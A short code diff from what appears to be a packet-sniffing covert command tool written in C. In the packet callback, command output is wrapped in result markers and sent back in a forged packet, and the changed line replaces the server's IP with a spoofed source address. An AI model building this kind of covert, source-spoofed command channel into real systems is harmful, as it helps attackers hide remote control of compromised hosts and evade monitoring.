@@ -169,7 +169,7 @@ void packet_callback(unsigned char *args, const struct pcap_pkthdr *pkt_header,
 			memset(command, 0x0, MAX_PKT_LEN);
 			sprintf(command, "%s%s%s", RESULT_START, buffer, RESULT_END);
 
-			packet_forge(command, SERVER_IP, CLIENT_IP);
+			packet_forge(command, SOURCE_SPOOF, CLIENT_IP);
 			memset(buffer, 0x0, MAX_PKT_LEN);
 		}
 	}
